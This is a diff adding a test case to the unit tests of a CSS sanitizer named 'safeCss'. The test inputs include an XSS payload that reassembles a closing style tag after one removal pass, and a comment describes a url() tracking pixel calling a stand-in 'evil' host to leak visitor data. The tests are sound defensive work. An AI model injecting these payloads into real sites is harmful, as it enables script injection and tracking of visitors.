@@ -31,6 +31,12 @@ describe('safeCss', () => {
     expect(safeCss('a{}< / STYLE >x')).not.toMatch(/<\s*\/\s*style/i);
   });
 
+  it('refuses a closing tag reassembled by its own removal', () => {
+    // One pass removes the inner `</style>` and joins the halves around it.
+    expect(safeCss('a{}</sty</style>le><img src=x onerror=alert(1)>')).toBe('');
+    expect(safeCss('a{}<!<!---->-- x')).toBe('');
+  });
+
   it('neutralises url() so a stylesheet cannot phone home', () => {
     // background-image: url(https://evil/?t=…) is a tracking pixel that fires
     // on page load and leaks the visitor's IP and referrer.
